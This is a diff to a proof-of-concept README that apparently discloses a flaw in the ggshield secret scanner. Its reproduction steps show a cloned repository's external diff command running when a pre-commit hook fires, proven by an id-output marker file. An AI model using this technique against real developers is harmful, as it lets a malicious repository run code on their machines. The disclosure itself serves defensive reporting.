@@ -21,9 +21,10 @@ Run these commands from outside any existing checkout:
 ```sh
 git clone https://github.com/Jakick/ggshield-gg01-poc.git
 cd ggshield-gg01-poc
-printf '%s\n' 'changed by triager' >> application.txt
+ggshield install --mode local
+printf '%s\n' 'changed by victim' >> application.txt
 git add application.txt
-ggshield secret scan pre-commit
+git -c user.name=Victim -c user.email=victim@example.test commit -m reproduce
 cat .ggshield-gg01-executed
 ```
 
@@ -31,7 +32,7 @@ Expected marker:
 
 ```text
 repository-controlled external diff executed
-uid=1000(triager) gid=1000(triager) groups=1000(triager)
+uid=1000(victim) gid=1000(victim) groups=1000(victim)
 ```
 
 The exact user and group values vary. The second line is the output of the
